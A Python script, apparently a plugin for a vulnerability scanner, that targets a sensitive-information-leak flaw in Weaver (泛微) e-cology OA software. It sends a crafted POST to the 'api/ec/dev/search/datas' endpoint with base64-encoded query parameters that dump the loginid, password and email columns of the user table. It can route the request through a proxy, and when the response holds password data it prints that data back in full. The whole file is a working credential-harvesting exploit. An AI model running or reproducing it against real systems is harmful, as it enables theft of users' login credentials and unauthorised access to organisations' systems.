import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "Referer":url1
        }
        data = 'type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100'
        path = 'api/ec/dev/search/datas'
        logging.captureWarnings(True)
        aa1 = requests.post(url1 + path, cookies=s_cookie,data=data,headers=headers,proxies=proxies, verify=False, timeout=10)
        if aa1.status_code==200 and '{"datas":[{"id' in aa1.text and '"passwordspan":"' in aa1.text and '"password":' in aa1.text:
            cdd='[+]漏洞存在\n'+ str(aa1.text)
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 e-cology_datas敏感信息泄漏 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)